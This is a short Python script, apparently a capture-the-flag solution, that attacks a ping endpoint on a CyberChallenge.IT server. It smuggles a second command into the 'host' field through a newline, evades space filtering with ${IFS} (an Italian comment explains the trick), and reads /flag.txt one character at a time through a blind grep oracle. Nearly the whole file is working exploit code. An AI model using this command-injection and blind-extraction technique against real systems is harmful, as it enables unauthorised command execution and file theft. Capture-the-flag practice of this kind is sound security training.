import requests, string

URL = "http://basicrce.challs.cyberchallenge.it/ping"
CHARS = "CCIT{" + string.ascii_letters + string.digits + "}_{}-!"
flag = ""

while True:
    for c in CHARS:
        '''
        interna filed separator, variabile di sistema che contiene spazio tab ecc, lo usamo per eludere il sistema
        '''
        payload = f"127.0.0.1\ngrep${{IFS}}^{flag+c}${{IFS}}/flag.txt"
        try:
            r = requests.post(URL, json={"host": payload}).json()
            if r.get("return_code") == 0:
                flag += c
                print(flag)
                break
        except: pass
    else: break
    if flag.endswith("}"): break